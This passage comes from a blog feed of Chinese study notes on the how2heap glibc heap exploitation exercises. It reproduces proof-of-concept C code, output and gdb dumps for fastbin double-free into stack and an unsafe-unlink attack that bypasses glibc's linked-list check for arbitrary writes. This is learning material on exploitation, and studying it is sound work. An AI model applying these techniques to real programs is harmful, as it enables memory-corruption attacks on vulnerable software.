0x55d93d93f420 points to this is A!</div></pre></td></tr></table></figure></p><p>看到，我改变了a的指向，当前的c的指向，又变回了this is A这个字符串<br>（这里提到的uaf，决定在总结完所有基础的知识后刷pwnable的题之后再详细写）</p><h2 id="0x02-fastbin-dup-into-stack"><a href="#0x02-fastbin-dup-into-stack" class="headerlink" title="0x02-fastbin_dup_into_stack"></a>0x02-fastbin_dup_into_stack</h2><p>这个部分是在上一个的基础上的延伸。<br>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">The address we want malloc() to return is 0x7fffffffe1d0.</div><div class="line">Allocating 3 buffers.</div><div class="line">1st malloc(8): 0x555555757420</div><div class="line">2nd malloc(8): 0x555555757440</div><div class="line">3rd malloc(8): 0x555555757460</div><div class="line">Freeing the first one...</div><div class="line">If we free 0x555555757420 again, things will crash because 0x555555757420 is at the top of the free list.</div><div class="line">So, instead, we&apos;ll free 0x555555757440.</div><div class="line">Now, we can free 0x555555757420 again, since it&apos;s not the head of the free list.</div><div class="line">Now the free list has [ 0x555555757420, 0x555555757440, 0x555555757420 ]. We&apos;ll now carry out our attack by modifying data at 0x555555757420.</div><div class="line">1st malloc(8): 0x555555757420</div><div class="line">2nd malloc(8): 0x555555757440</div><div class="line">Now the free list has [ 0x555555757420 ].</div><div class="line">Now, we have access to 0x555555757420 while it remains at the head of the free list.</div><div class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</div><div class="line">so that malloc will think there is a free chunk there and agree to</div><div class="line">return a pointer to it.</div><div class="line">Now, we overwrite the first 8 bytes of the data at 0x555555757420 to point right before the 0x20.</div></pre></td></tr></table></figure></p><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">printf(&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</div><div class="line">       &quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;);</div><div class="line"></div><div class="line">unsigned long long stack_var;</div><div class="line"></div><div class="line">printf(&quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var);</div><div class="line"></div><div class="line">printf(&quot;Allocating 3 buffers.\n&quot;);</div><div class="line">int *a = malloc(8);</div><div class="line">int *b = malloc(8);</div><div class="line">int *c = malloc(8);</div><div class="line"></div><div class="line">printf(&quot;1st malloc(8): %p\n&quot;, a);</div><div class="line">printf(&quot;2nd malloc(8): %p\n&quot;, b);</div><div class="line">printf(&quot;3rd malloc(8): %p\n&quot;, c);</div><div class="line"></div><div class="line">printf(&quot;Freeing the first one...\n&quot;);</div><div class="line">free(a);</div><div class="line"></div><div class="line">printf(&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</div><div class="line">// free(a);</div><div class="line"></div><div class="line">printf(&quot;So, instead, we&apos;ll free %p.\n&quot;, b);</div><div class="line">free(b);</div><div class="line"></div><div class="line">printf(&quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</div><div class="line">free(a);</div><div class="line"></div><div class="line">printf(&quot;Now the free list has [ %p, %p, %p ]. &quot;</div><div class="line">&quot;We&apos;ll now carry out our attack by modifying data at %p.\n&quot;, a, b, a, a);</div><div class="line">unsigned long long *d = malloc(8);</div><div class="line"></div><div class="line">printf(&quot;1st malloc(8): %p\n&quot;, d);</div><div class="line">printf(&quot;2nd malloc(8): %p\n&quot;, malloc(8));</div><div class="line">printf(&quot;Now the free list has [ %p ].\n&quot;, a);</div><div class="line">printf(&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</div><div class="line">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</div><div class="line">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</div><div class="line">&quot;return a pointer to it.\n&quot;, a);</div><div class="line">stack_var = 0x20;</div><div class="line"></div><div class="line">printf(&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);</div><div class="line">*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</div><div class="line"></div><div class="line">printf(&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));</div><div class="line">printf(&quot;4th malloc(8): %p\n&quot;, malloc(8));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>总结来说，这个程序想表达的就是通过fastbin的问题来达到malloc一个<strong>指定，可控</strong>地址的效果</p><p>这个地址可以是栈上的，也可以是堆的</p><p>重点其实就是伪造一个free-chunk，利用double-free来进行</p><p>这个地方的一个坑一开始没看懂，就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">printf(&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);</div><div class="line">*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</div></pre></td></tr></table></figure></p><p>两个问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unsigned long long stack_var</div></pre></td></tr></table></figure><p>1.为什么向0x555555757420前8byte写   &amp;stack_var-8<br>2.为什么写0x20给stack_var</p><p>其实很简单</p><p>一.就是改fd，这样在malloc了第三次之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; fastbins </div><div class="line">fastbins</div><div class="line">0x20: 0x555555757410 —▸ 0x7fffffffe1c0 —▸ 0x555555757420 ◂— 0x0</div><div class="line">0x30: 0x0</div><div class="line">0x40: 0x0</div><div class="line">0x50: 0x0</div><div class="line">0x60: 0x0</div><div class="line">0x70: 0x0</div><div class="line">0x80: 0x0</div></pre></td></tr></table></figure></p><p> 0x7fffffffe1c0就到了fastbin的顶部，就是下一个待malloc的地址（这里注意，准确的说，是那个chunk的头地址，返回的是我们想指定的那个）</p><p>二.为什么写0x20，很简单，chunk的构造，四部分</p><p><img src="https://i.imgur.com/dnTKgir.jpg" alt=""><br>（图只是表示同一个人类型，具体的地址不同）</p><p>当前的chunk我们需要的是4*0x8=0x20的大小，所以成功构造了一个chunk再加上之前的写地址，这个chunk就会被malloc出啦！！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x7fffffffe1c0 --&gt; 0x0 </div><div class="line">0008| 0x7fffffffe1c8 --&gt; 0x20 (&apos; &apos;)</div><div class="line">0016| 0x7fffffffe1d0 --&gt; 0x555555757420 --&gt; 0x7fffffffe1c0 --&gt; 0x0 </div><div class="line">0024| 0x7fffffffe1d8 --&gt; 0x555555757460 --&gt; 0x0</div></pre></td></tr></table></figure></p><p>看栈的状态，就是在栈上构造了这个chunk，当然，可以想到，0x555555757420又会被插入fast链</p><p><img src="https://i.imgur.com/y5QwIEp.png" alt=""></p><p>这里我想记录一下，写8byte的时候，是从红箭头写的，写入的8byte是黄箭头的，当然都是相对各自的chunk而言</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><pre><code>nothing</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-first-fit&quot;&gt;&lt;a href=&quot;#0x01-first-fit&quot; class=&quot;headerlink&quot; title=&quot;0x01-first-fit&quot;&gt;&lt;/a&gt;0x01-first-fit&lt;/h2&gt;&lt;figure class=&quot;highlight 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>how2heap-unlink</title>
    <link href="http://yoursite.com/2017/09/21/how2heap-unlink/"/>
    <id>http://yoursite.com/2017/09/21/how2heap-unlink/</id>
    <published>2017-09-21T09:49:54.000Z</published>
    <updated>2017-09-24T16:40:34.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>这是我的第一篇po文，大二成功转到了信息安全实验班，大一下接触的二进制，马马虎虎，希望从今天开始，能更加的脚踏实地，把每个环节都扎实下来，有所进步！</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>堆的unlink，其实最关键的就是两个指针互相写的过程，利用unlink这个双链表删除操作，达到目的。<br>1.最初的unlink，没有相关的检测机制，所以我们可以直接利用这个unlink宏来达成对got表的修改。<br>2，现在的unlink加入了一些保护机制，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                     </div><div class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);</div></pre></td></tr></table></figure></p><p>对于二者，要检测是否相同因此就需要一个绕过，对于二者的不同，可以参照这篇文章<a href="http://wooyun.jozxing.cc/static/drops/tips-7326.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-7326.html</a></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>开始how2heap的例子，第一次我准备将我菜鸡般的gdb调试过程记录下，虽然程序编译后都给出了相应的结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line"></div><div class="line"></div><div class="line">uint64_t *chunk0_ptr;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">printf(&quot;Welcome to unsafe unlink 2.0!\n&quot;);</div><div class="line">printf(&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;);</div><div class="line">printf(&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;);</div><div class="line">printf(&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;);</div><div class="line"></div><div class="line">int malloc_size = 0x80; //we want to be big enough not to use fastbins</div><div class="line">int header_size = 2;</div><div class="line"></div><div class="line">printf(&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;);</div><div class="line"></div><div class="line">chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0</div><div class="line">uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1</div><div class="line">printf(&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;, &amp;chunk0_ptr, chunk0_ptr);</div><div class="line">printf(&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;, chunk1_ptr);</div><div class="line"></div><div class="line">printf(&quot;We create a fake chunk inside chunk0.\n&quot;);</div><div class="line">--------</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>程序我简略了许多，（反正是自己的笔记）</p><p>堆的unlink文章我看了一些，在还没有真正实战的情况下，我觉得首要就是先找出一个全局可修改指针或自己构造（目前先这么理解）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ p chunk0_ptr</div><div class="line">$1 = (uint64_t *) 0x555555757420</div><div class="line">gdb-peda$ p &amp;chunk0_ptr</div><div class="line">$2 = (uint64_t **) 0x555555756050 &lt;chunk0_ptr&gt;</div></pre></td></tr></table></figure></p><p>可以看到Chunk0的所在位置和内存内容<br>而我们的构造，就是要以Chunk0(下文用B来指代)，为基准。<br>所以，这就关系到chunk的结构!<br><a href="http://security.pingan.com/static/upload/2eb47c85f5a863a5c2904e529c0409a6.png" target="_blank" rel="external"></a><br>分别为（64位下）0x8的prev_size和其他都是0x8！<br>所以构造<br>fd= 0x555555756050-0x18<br>bk=  0x555555756050-0x10<br>这样p-&gt;fd-&gt;bk==p-&gt;bk-&gt;fd==B这样就绕开了第一个检查<br>（这里在调试的时候第一次把断点下在free函数，出现一些小问题，后来直接list源代码，下在free那一行，不懂什么问题，记录一下）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/50gx 0x555555757420</div><div class="line">0x555555757420:0x00000000000000000x0000000000000008</div><div class="line">0x555555757430:0x00005555557560380x0000555555756040  #chunk0的fd，bk</div><div class="line">0x555555757440:0x00000000000000000x0000000000000000</div><div class="line">0x555555757450:0x00000000000000000x0000000000000000</div><div class="line">0x555555757460:0x00000000000000000x0000000000000000</div><div class="line">0x555555757470:0x00000000000000000x0000000000000000</div><div class="line">0x555555757480:0x00000000000000000x0000000000000000</div><div class="line">0x555555757490:0x00000000000000000x0000000000000000</div><div class="line">0x5555557574a0:0x00000000000000800x0000000000000090  #chunk1的头，注意最后三位是三个标志位，prev_inuse=0</div><div class="line">0x5555557574b0:0x00000000000000000x0000000000000000  #chunk1的返回指针</div><div class="line">0x5555557574c0:0x00000000000000000x0000000000000000</div><div class="line">0x5555557574d0:0x00000000000000000x0000000000000000</div><div class="line">0x5555557574e0:0x00000000000000000x0000000000000000</div><div class="line">0x5555557574f0:0x00000000000000000x0000000000000000</div><div class="line">0x555555757500:0x00000000000000000x0000000000000000</div><div class="line">0x555555757510:0x00000000000000000x0000000000000000</div><div class="line">0x555555757520:0x00000000000000000x0000000000000000</div><div class="line">0x555555757530:0x00000000000000000x0000000000020ad1</div><div class="line">0x555555757540:0x00000000000000000x0000000000000000</div><div class="line">0x555555757550:0x00000000000000000x0000000000000000</div><div class="line">0x555555757560:0x00000000000000000x0000000000000000</div><div class="line">0x555555757570:0x00000000000000000x0000000000000000</div><div class="line">0x555555757580:0x00000000000000000x0000000000000000</div><div class="line">0x555555757590:0x00000000000000000x0000000000000000</div><div class="line">0x5555557575a0:0x00000000000000000x0000000000000000</div></pre></td></tr></table></figure><p>（在源码中，就是写成chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);）即64位的size<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ p chunk1_ptr</div><div class="line">$3 = (uint64_t *) 0x5555557574b0</div></pre></td></tr></table></figure></p><p>看一下本身构造的用来free的chunk1，刚好复习了概念，chunk的返回指针与头部的不相等关系，在glibc中，其实chunk就是个结构体的概念，而所有的变量都是通过的偏移形成的，这在很多计算机应用是基本的偏移寻址（联想到微机），所以就有了下面的理解。</p><p>还需要关注另外两个验证，即以chunk1（fake chunk）为基准，考虑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chunksize(P) != prev_size (nextchunk(P)) == False</div></pre></td></tr></table></figure></p><p>即chunk1的next_chunk的prev_size要和chunk1的size相等，这里关注next_chunk怎么寻址到的，就是通过chunk1的size来偏移的，chunk1的size是0，所以最终等式就是0=0.（还没验证，先留个bug）</p><p>最后在free之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ p chunk0_ptr</div><div class="line">$3 = (uint64_t *) 0x555555756038</div></pre></td></tr></table></figure></p><p>（断点设在free函数之后，不然程序运行到底，额···&lt;萌新的记录&gt;）</p><p>所以只要向chunk0_ptr写，就可以把偏移3*0x8即第四个单位大小的任意地址写入任意东西</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>常用的利用方法思路，写入got表，再修改got或有list堆，即显示got地址，反正一堆balabala</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;这是我的第一篇po文，大二成功转到了信息安全实验班，大一下接触的二进制，马马虎虎，希望从今天开始，能更加的脚踏实地，把每个环
      
    
    </summary>
    
    
  </entry>
  
</feed>
